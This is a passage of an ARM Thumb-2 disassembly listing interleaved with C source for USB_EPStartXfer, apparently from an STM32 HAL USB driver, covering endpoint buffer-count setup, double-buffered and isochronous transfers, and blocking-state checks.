 8007a40:	691b      	ldr	r3, [r3, #16]
 8007a42:	095b      	lsrs	r3, r3, #5
 8007a44:	f8c7 30e4 	str.w	r3, [r7, #228]	; 0xe4
 8007a48:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a4c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007a50:	681b      	ldr	r3, [r3, #0]
 8007a52:	691b      	ldr	r3, [r3, #16]
 8007a54:	f003 031f 	and.w	r3, r3, #31
 8007a58:	2b00      	cmp	r3, #0
 8007a5a:	d104      	bne.n	8007a66 <USB_EPStartXfer+0xfe0>
 8007a5c:	f8d7 30e4 	ldr.w	r3, [r7, #228]	; 0xe4
 8007a60:	3b01      	subs	r3, #1
 8007a62:	f8c7 30e4 	str.w	r3, [r7, #228]	; 0xe4
 8007a66:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007a6a:	881b      	ldrh	r3, [r3, #0]
 8007a6c:	b29a      	uxth	r2, r3
 8007a6e:	f8d7 30e4 	ldr.w	r3, [r7, #228]	; 0xe4
 8007a72:	b29b      	uxth	r3, r3
 8007a74:	029b      	lsls	r3, r3, #10
 8007a76:	b29b      	uxth	r3, r3
 8007a78:	4313      	orrs	r3, r2
 8007a7a:	b29b      	uxth	r3, r3
 8007a7c:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007a80:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007a84:	b29a      	uxth	r2, r3
 8007a86:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007a8a:	801a      	strh	r2, [r3, #0]
 8007a8c:	e070      	b.n	8007b70 <USB_EPStartXfer+0x10ea>
 8007a8e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a92:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007a96:	681b      	ldr	r3, [r3, #0]
 8007a98:	691b      	ldr	r3, [r3, #16]
 8007a9a:	2b00      	cmp	r3, #0
 8007a9c:	d10c      	bne.n	8007ab8 <USB_EPStartXfer+0x1032>
 8007a9e:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007aa2:	881b      	ldrh	r3, [r3, #0]
 8007aa4:	b29b      	uxth	r3, r3
 8007aa6:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007aaa:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007aae:	b29a      	uxth	r2, r3
 8007ab0:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007ab4:	801a      	strh	r2, [r3, #0]
 8007ab6:	e05b      	b.n	8007b70 <USB_EPStartXfer+0x10ea>
 8007ab8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007abc:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007ac0:	681b      	ldr	r3, [r3, #0]
 8007ac2:	691b      	ldr	r3, [r3, #16]
 8007ac4:	085b      	lsrs	r3, r3, #1
 8007ac6:	f8c7 30e4 	str.w	r3, [r7, #228]	; 0xe4
 8007aca:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007ace:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007ad2:	681b      	ldr	r3, [r3, #0]
 8007ad4:	691b      	ldr	r3, [r3, #16]
 8007ad6:	f003 0301 	and.w	r3, r3, #1
 8007ada:	2b00      	cmp	r3, #0
 8007adc:	d004      	beq.n	8007ae8 <USB_EPStartXfer+0x1062>
 8007ade:	f8d7 30e4 	ldr.w	r3, [r7, #228]	; 0xe4
 8007ae2:	3301      	adds	r3, #1
 8007ae4:	f8c7 30e4 	str.w	r3, [r7, #228]	; 0xe4
 8007ae8:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007aec:	881b      	ldrh	r3, [r3, #0]
 8007aee:	b29a      	uxth	r2, r3
 8007af0:	f8d7 30e4 	ldr.w	r3, [r7, #228]	; 0xe4
 8007af4:	b29b      	uxth	r3, r3
 8007af6:	029b      	lsls	r3, r3, #10
 8007af8:	b29b      	uxth	r3, r3
 8007afa:	4313      	orrs	r3, r2
 8007afc:	b29a      	uxth	r2, r3
 8007afe:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007b02:	801a      	strh	r2, [r3, #0]
 8007b04:	e034      	b.n	8007b70 <USB_EPStartXfer+0x10ea>
 8007b06:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b0a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007b0e:	681b      	ldr	r3, [r3, #0]
 8007b10:	785b      	ldrb	r3, [r3, #1]
 8007b12:	2b01      	cmp	r3, #1
 8007b14:	d12c      	bne.n	8007b70 <USB_EPStartXfer+0x10ea>
 8007b16:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b1a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007b1e:	681b      	ldr	r3, [r3, #0]
 8007b20:	f8c7 30b4 	str.w	r3, [r7, #180]	; 0xb4
 8007b24:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b28:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007b2c:	681b      	ldr	r3, [r3, #0]
 8007b2e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007b32:	b29b      	uxth	r3, r3
 8007b34:	461a      	mov	r2, r3
 8007b36:	f8d7 30b4 	ldr.w	r3, [r7, #180]	; 0xb4
 8007b3a:	4413      	add	r3, r2
 8007b3c:	f8c7 30b4 	str.w	r3, [r7, #180]	; 0xb4
 8007b40:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b44:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007b48:	681b      	ldr	r3, [r3, #0]
 8007b4a:	781b      	ldrb	r3, [r3, #0]
 8007b4c:	00da      	lsls	r2, r3, #3
 8007b4e:	f8d7 30b4 	ldr.w	r3, [r7, #180]	; 0xb4
 8007b52:	4413      	add	r3, r2
 8007b54:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007b58:	f8c7 30b0 	str.w	r3, [r7, #176]	; 0xb0
 8007b5c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b60:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007b64:	681b      	ldr	r3, [r3, #0]
 8007b66:	691b      	ldr	r3, [r3, #16]
 8007b68:	b29a      	uxth	r2, r3
 8007b6a:	f8d7 30b0 	ldr.w	r3, [r7, #176]	; 0xb0
 8007b6e:	801a      	strh	r2, [r3, #0]
 8007b70:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b74:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007b78:	681b      	ldr	r3, [r3, #0]
 8007b7a:	f8c7 30a4 	str.w	r3, [r7, #164]	; 0xa4
 8007b7e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b82:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007b86:	681b      	ldr	r3, [r3, #0]
 8007b88:	785b      	ldrb	r3, [r3, #1]
 8007b8a:	2b00      	cmp	r3, #0
 8007b8c:	f040 809d 	bne.w	8007cca <USB_EPStartXfer+0x1244>
 8007b90:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b94:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007b98:	681b      	ldr	r3, [r3, #0]
 8007b9a:	f8c7 309c 	str.w	r3, [r7, #156]	; 0x9c
 8007b9e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007ba2:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007ba6:	681b      	ldr	r3, [r3, #0]
 8007ba8:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007bac:	b29b      	uxth	r3, r3
 8007bae:	461a      	mov	r2, r3
 8007bb0:	f8d7 309c 	ldr.w	r3, [r7, #156]	; 0x9c
 8007bb4:	4413      	add	r3, r2
 8007bb6:	f8c7 309c 	str.w	r3, [r7, #156]	; 0x9c
 8007bba:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007bbe:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007bc2:	681b      	ldr	r3, [r3, #0]
 8007bc4:	781b      	ldrb	r3, [r3, #0]
 8007bc6:	00da      	lsls	r2, r3, #3
 8007bc8:	f8d7 309c 	ldr.w	r3, [r7, #156]	; 0x9c
 8007bcc:	4413      	add	r3, r2
 8007bce:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007bd2:	f8c7 3098 	str.w	r3, [r7, #152]	; 0x98
 8007bd6:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007bda:	881b      	ldrh	r3, [r3, #0]
 8007bdc:	b29b      	uxth	r3, r3
 8007bde:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007be2:	b29a      	uxth	r2, r3
 8007be4:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007be8:	801a      	strh	r2, [r3, #0]
 8007bea:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007bee:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007bf2:	681b      	ldr	r3, [r3, #0]
 8007bf4:	691b      	ldr	r3, [r3, #16]
 8007bf6:	2b3e      	cmp	r3, #62	; 0x3e
 8007bf8:	d92b      	bls.n	8007c52 <USB_EPStartXfer+0x11cc>
 8007bfa:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007bfe:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007c02:	681b      	ldr	r3, [r3, #0]
 8007c04:	691b      	ldr	r3, [r3, #16]
 8007c06:	095b      	lsrs	r3, r3, #5
 8007c08:	f8c7 30e0 	str.w	r3, [r7, #224]	; 0xe0
 8007c0c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c10:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007c14:	681b      	ldr	r3, [r3, #0]
 8007c16:	691b      	ldr	r3, [r3, #16]
 8007c18:	f003 031f 	and.w	r3, r3, #31
 8007c1c:	2b00      	cmp	r3, #0
 8007c1e:	d104      	bne.n	8007c2a <USB_EPStartXfer+0x11a4>
 8007c20:	f8d7 30e0 	ldr.w	r3, [r7, #224]	; 0xe0
 8007c24:	3b01      	subs	r3, #1
 8007c26:	f8c7 30e0 	str.w	r3, [r7, #224]	; 0xe0
 8007c2a:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007c2e:	881b      	ldrh	r3, [r3, #0]
 8007c30:	b29a      	uxth	r2, r3
 8007c32:	f8d7 30e0 	ldr.w	r3, [r7, #224]	; 0xe0
 8007c36:	b29b      	uxth	r3, r3
 8007c38:	029b      	lsls	r3, r3, #10
 8007c3a:	b29b      	uxth	r3, r3
 8007c3c:	4313      	orrs	r3, r2
 8007c3e:	b29b      	uxth	r3, r3
 8007c40:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007c44:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007c48:	b29a      	uxth	r2, r3
 8007c4a:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007c4e:	801a      	strh	r2, [r3, #0]
 8007c50:	e069      	b.n	8007d26 <USB_EPStartXfer+0x12a0>
 8007c52:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c56:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007c5a:	681b      	ldr	r3, [r3, #0]
 8007c5c:	691b      	ldr	r3, [r3, #16]
 8007c5e:	2b00      	cmp	r3, #0
 8007c60:	d10c      	bne.n	8007c7c <USB_EPStartXfer+0x11f6>
 8007c62:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007c66:	881b      	ldrh	r3, [r3, #0]
 8007c68:	b29b      	uxth	r3, r3
 8007c6a:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007c6e:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007c72:	b29a      	uxth	r2, r3
 8007c74:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007c78:	801a      	strh	r2, [r3, #0]
 8007c7a:	e054      	b.n	8007d26 <USB_EPStartXfer+0x12a0>
 8007c7c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c80:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007c84:	681b      	ldr	r3, [r3, #0]
 8007c86:	691b      	ldr	r3, [r3, #16]
 8007c88:	085b      	lsrs	r3, r3, #1
 8007c8a:	f8c7 30e0 	str.w	r3, [r7, #224]	; 0xe0
 8007c8e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c92:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007c96:	681b      	ldr	r3, [r3, #0]
 8007c98:	691b      	ldr	r3, [r3, #16]
 8007c9a:	f003 0301 	and.w	r3, r3, #1
 8007c9e:	2b00      	cmp	r3, #0
 8007ca0:	d004      	beq.n	8007cac <USB_EPStartXfer+0x1226>
 8007ca2:	f8d7 30e0 	ldr.w	r3, [r7, #224]	; 0xe0
 8007ca6:	3301      	adds	r3, #1
 8007ca8:	f8c7 30e0 	str.w	r3, [r7, #224]	; 0xe0
 8007cac:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007cb0:	881b      	ldrh	r3, [r3, #0]
 8007cb2:	b29a      	uxth	r2, r3
 8007cb4:	f8d7 30e0 	ldr.w	r3, [r7, #224]	; 0xe0
 8007cb8:	b29b      	uxth	r3, r3
 8007cba:	029b      	lsls	r3, r3, #10
 8007cbc:	b29b      	uxth	r3, r3
 8007cbe:	4313      	orrs	r3, r2
 8007cc0:	b29a      	uxth	r2, r3
 8007cc2:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007cc6:	801a      	strh	r2, [r3, #0]
 8007cc8:	e02d      	b.n	8007d26 <USB_EPStartXfer+0x12a0>
 8007cca:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007cce:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007cd2:	681b      	ldr	r3, [r3, #0]
 8007cd4:	785b      	ldrb	r3, [r3, #1]
 8007cd6:	2b01      	cmp	r3, #1
 8007cd8:	d125      	bne.n	8007d26 <USB_EPStartXfer+0x12a0>
 8007cda:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007cde:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007ce2:	681b      	ldr	r3, [r3, #0]
 8007ce4:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007ce8:	b29b      	uxth	r3, r3
 8007cea:	461a      	mov	r2, r3
 8007cec:	f8d7 30a4 	ldr.w	r3, [r7, #164]	; 0xa4
 8007cf0:	4413      	add	r3, r2
 8007cf2:	f8c7 30a4 	str.w	r3, [r7, #164]	; 0xa4
 8007cf6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007cfa:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007cfe:	681b      	ldr	r3, [r3, #0]
 8007d00:	781b      	ldrb	r3, [r3, #0]
 8007d02:	00da      	lsls	r2, r3, #3
 8007d04:	f8d7 30a4 	ldr.w	r3, [r7, #164]	; 0xa4
 8007d08:	4413      	add	r3, r2
 8007d0a:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007d0e:	f8c7 30a0 	str.w	r3, [r7, #160]	; 0xa0
 8007d12:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d16:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d1a:	681b      	ldr	r3, [r3, #0]
 8007d1c:	691b      	ldr	r3, [r3, #16]
 8007d1e:	b29a      	uxth	r2, r3
 8007d20:	f8d7 30a0 	ldr.w	r3, [r7, #160]	; 0xa0
 8007d24:	801a      	strh	r2, [r3, #0]

        /* Coming from ISR */
        if (ep->xfer_count != 0U)
 8007d26:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d2a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d2e:	681b      	ldr	r3, [r3, #0]
 8007d30:	69db      	ldr	r3, [r3, #28]
 8007d32:	2b00      	cmp	r3, #0
 8007d34:	f000 8218 	beq.w	8008168 <USB_EPStartXfer+0x16e2>
        {
          /* update last value to check if there is blocking state */
          wEPVal = PCD_GET_ENDPOINT(USBx, ep->num);
 8007d38:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d3c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007d40:	681a      	ldr	r2, [r3, #0]
 8007d42:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d46:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d4a:	681b      	ldr	r3, [r3, #0]
 8007d4c:	781b      	ldrb	r3, [r3, #0]
 8007d4e:	009b      	lsls	r3, r3, #2
 8007d50:	4413      	add	r3, r2
 8007d52:	881b      	ldrh	r3, [r3, #0]
 8007d54:	f8a7 3096 	strh.w	r3, [r7, #150]	; 0x96

          /*Blocking State */
          if ((((wEPVal & USB_EP_DTOG_RX) != 0U) && ((wEPVal & USB_EP_DTOG_TX) != 0U)) ||
 8007d58:	f8b7 3096 	ldrh.w	r3, [r7, #150]	; 0x96
 8007d5c:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8007d60:	2b00      	cmp	r3, #0
 8007d62:	d005      	beq.n	8007d70 <USB_EPStartXfer+0x12ea>
 8007d64:	f8b7 3096 	ldrh.w	r3, [r7, #150]	; 0x96
 8007d68:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8007d6c:	2b00      	cmp	r3, #0
 8007d6e:	d10d      	bne.n	8007d8c <USB_EPStartXfer+0x1306>
              (((wEPVal & USB_EP_DTOG_RX) == 0U) && ((wEPVal & USB_EP_DTOG_TX) == 0U)))
 8007d70:	f8b7 3096 	ldrh.w	r3, [r7, #150]	; 0x96
 8007d74:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
          if ((((wEPVal & USB_EP_DTOG_RX) != 0U) && ((wEPVal & USB_EP_DTOG_TX) != 0U)) ||
 8007d78:	2b00      	cmp	r3, #0
 8007d7a:	f040 81f5 	bne.w	8008168 <USB_EPStartXfer+0x16e2>
              (((wEPVal & USB_EP_DTOG_RX) == 0U) && ((wEPVal & USB_EP_DTOG_TX) == 0U)))
 8007d7e:	f8b7 3096 	ldrh.w	r3, [r7, #150]	; 0x96
 8007d82:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8007d86:	2b00      	cmp	r3, #0
 8007d88:	f040 81ee 	bne.w	8008168 <USB_EPStartXfer+0x16e2>
          {
            PCD_FREE_USER_BUFFER(USBx, ep->num, 0U);
 8007d8c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d90:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007d94:	681a      	ldr	r2, [r3, #0]
 8007d96:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d9a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d9e:	681b      	ldr	r3, [r3, #0]
 8007da0:	781b      	ldrb	r3, [r3, #0]
 8007da2:	009b      	lsls	r3, r3, #2
 8007da4:	4413      	add	r3, r2
 8007da6:	881b      	ldrh	r3, [r3, #0]
 8007da8:	b29b      	uxth	r3, r3
 8007daa:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8007dae:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8007db2:	f8a7 3094 	strh.w	r3, [r7, #148]	; 0x94
 8007db6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007dba:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007dbe:	681a      	ldr	r2, [r3, #0]
 8007dc0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007dc4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007dc8:	681b      	ldr	r3, [r3, #0]
 8007dca:	781b      	ldrb	r3, [r3, #0]
 8007dcc:	009b      	lsls	r3, r3, #2
 8007dce:	441a      	add	r2, r3
 8007dd0:	f8b7 3094 	ldrh.w	r3, [r7, #148]	; 0x94
 8007dd4:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8007dd8:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8007ddc:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8007de0:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8007de4:	b29b      	uxth	r3, r3
 8007de6:	8013      	strh	r3, [r2, #0]
 8007de8:	e1be      	b.n	8008168 <USB_EPStartXfer+0x16e2>
          }
        }
      }
      /* iso out double */
      else if (ep->type == EP_TYPE_ISOC)
 8007dea:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007dee:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007df2:	681b      	ldr	r3, [r3, #0]
 8007df4:	78db      	ldrb	r3, [r3, #3]
 8007df6:	2b01      	cmp	r3, #1
 8007df8:	f040 81b4 	bne.w	8008164 <USB_EPStartXfer+0x16de>
      {
        /* Multi packet transfer */
        if (ep->xfer_len > ep->maxpacket)
 8007dfc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e00:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007e04:	681b      	ldr	r3, [r3, #0]
 8007e06:	699a      	ldr	r2, [r3, #24]
 8007e08:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e0c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007e10:	681b      	ldr	r3, [r3, #0]
 8007e12:	691b      	ldr	r3, [r3, #16]
 8007e14:	429a      	cmp	r2, r3
 8007e16:	d917      	bls.n	8007e48 <USB_EPStartXfer+0x13c2>
        {
          len = ep->maxpacket;
 8007e18:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e1c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007e20:	681b      	ldr	r3, [r3, #0]
 8007e22:	691b      	ldr	r3, [r3, #16]
 8007e24:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
          ep->xfer_len -= len;
 8007e28:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e2c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007e30:	681b      	ldr	r3, [r3, #0]
 8007e32:	699a      	ldr	r2, [r3, #24]
 8007e34:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007e38:	1ad2      	subs	r2, r2, r3
 8007e3a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e3e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007e42:	681b      	ldr	r3, [r3, #0]
 8007e44:	619a      	str	r2, [r3, #24]
 8007e46:	e00e      	b.n	8007e66 <USB_EPStartXfer+0x13e0>
        }
        else
        {
          len = ep->xfer_len;
 8007e48:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e4c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007e50:	681b      	ldr	r3, [r3, #0]
 8007e52:	699b      	ldr	r3, [r3, #24]
 8007e54:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
          ep->xfer_len = 0U;
 8007e58:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e5c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007e60:	681b      	ldr	r3, [r3, #0]
 8007e62:	2200      	movs	r2, #0
 8007e64:	619a      	str	r2, [r3, #24]
        }
        PCD_SET_EP_DBUF_CNT(USBx, ep->num, ep->is_in, len);
 8007e66:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e6a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007e6e:	681b      	ldr	r3, [r3, #0]
 8007e70:	785b      	ldrb	r3, [r3, #1]
 8007e72:	2b00      	cmp	r3, #0
 8007e74:	f040 8085 	bne.w	8007f82 <USB_EPStartXfer+0x14fc>
 8007e78:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e7c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007e80:	681b      	ldr	r3, [r3, #0]
 8007e82:	f8c7 30cc 	str.w	r3, [r7, #204]	; 0xcc
 8007e86:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e8a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007e8e:	681b      	ldr	r3, [r3, #0]
 8007e90:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007e94:	b29b      	uxth	r3, r3
 8007e96:	461a      	mov	r2, r3
 8007e98:	f8d7 30cc 	ldr.w	r3, [r7, #204]	; 0xcc
 8007e9c:	4413      	add	r3, r2
 8007e9e:	f8c7 30cc 	str.w	r3, [r7, #204]	; 0xcc
 8007ea2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007ea6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007eaa:	681b      	ldr	r3, [r3, #0]
 8007eac:	781b      	ldrb	r3, [r3, #0]
 8007eae:	00da      	lsls	r2, r3, #3
 8007eb0:	f8d7 30cc 	ldr.w	r3, [r7, #204]	; 0xcc
 8007eb4:	4413      	add	r3, r2
 8007eb6:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007eba:	f8c7 30c8 	str.w	r3, [r7, #200]	; 0xc8
 8007ebe:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007ec2:	881b      	ldrh	r3, [r3, #0]
 8007ec4:	b29b      	uxth	r3, r3
 8007ec6:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007eca:	b29a      	uxth	r2, r3
 8007ecc:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007ed0:	801a      	strh	r2, [r3, #0]
 8007ed2:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007ed6:	2b3e      	cmp	r3, #62	; 0x3e
 8007ed8:	d923      	bls.n	8007f22 <USB_EPStartXfer+0x149c>
 8007eda:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007ede:	095b      	lsrs	r3, r3, #5
 8007ee0:	f8c7 30dc 	str.w	r3, [r7, #220]	; 0xdc
 8007ee4:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007ee8:	f003 031f 	and.w	r3, r3, #31
 8007eec:	2b00      	cmp	r3, #0
 8007eee:	d104      	bne.n	8007efa <USB_EPStartXfer+0x1474>
 8007ef0:	f8d7 30dc 	ldr.w	r3, [r7, #220]	; 0xdc
 8007ef4:	3b01      	subs	r3, #1
 8007ef6:	f8c7 30dc 	str.w	r3, [r7, #220]	; 0xdc
 8007efa:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007efe:	881b      	ldrh	r3, [r3, #0]
 8007f00:	b29a      	uxth	r2, r3
 8007f02:	f8d7 30dc 	ldr.w	r3, [r7, #220]	; 0xdc
 8007f06:	b29b      	uxth	r3, r3
 8007f08:	029b      	lsls	r3, r3, #10
 8007f0a:	b29b      	uxth	r3, r3
 8007f0c:	4313      	orrs	r3, r2
 8007f0e:	b29b      	uxth	r3, r3
 8007f10:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007f14:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007f18:	b29a      	uxth	r2, r3
 8007f1a:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007f1e:	801a      	strh	r2, [r3, #0]
 8007f20:	e060      	b.n	8007fe4 <USB_EPStartXfer+0x155e>
 8007f22:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007f26:	2b00      	cmp	r3, #0
 8007f28:	d10c      	bne.n	8007f44 <USB_EPStartXfer+0x14be>
 8007f2a:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007f2e:	881b      	ldrh	r3, [r3, #0]
 8007f30:	b29b      	uxth	r3, r3
 8007f32:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007f36:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007f3a:	b29a      	uxth	r2, r3
 8007f3c:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007f40:	801a      	strh	r2, [r3, #0]
 8007f42:	e04f      	b.n	8007fe4 <USB_EPStartXfer+0x155e>
 8007f44:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007f48:	085b      	lsrs	r3, r3, #1
 8007f4a:	f8c7 30dc 	str.w	r3, [r7, #220]	; 0xdc
 8007f4e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007f52:	f003 0301 	and.w	r3, r3, #1
 8007f56:	2b00      	cmp	r3, #0
 8007f58:	d004      	beq.n	8007f64 <USB_EPStartXfer+0x14de>
 8007f5a:	f8d7 30dc 	ldr.w	r3, [r7, #220]	; 0xdc
 8007f5e:	3301      	adds	r3, #1
 8007f60:	f8c7 30dc 	str.w	r3, [r7, #220]	; 0xdc
 8007f64:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007f68:	881b      	ldrh	r3, [r3, #0]
 8007f6a:	b29a      	uxth	r2, r3
 8007f6c:	f8d7 30dc 	ldr.w	r3, [r7, #220]	; 0xdc
 8007f70:	b29b      	uxth	r3, r3
 8007f72:	029b      	lsls	r3, r3, #10
 8007f74:	b29b      	uxth	r3, r3
 8007f76:	4313      	orrs	r3, r2
 8007f78:	b29a      	uxth	r2, r3
 8007f7a:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007f7e:	801a      	strh	r2, [r3, #0]
 8007f80:	e030      	b.n	8007fe4 <USB_EPStartXfer+0x155e>
 8007f82:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f86:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007f8a:	681b      	ldr	r3, [r3, #0]
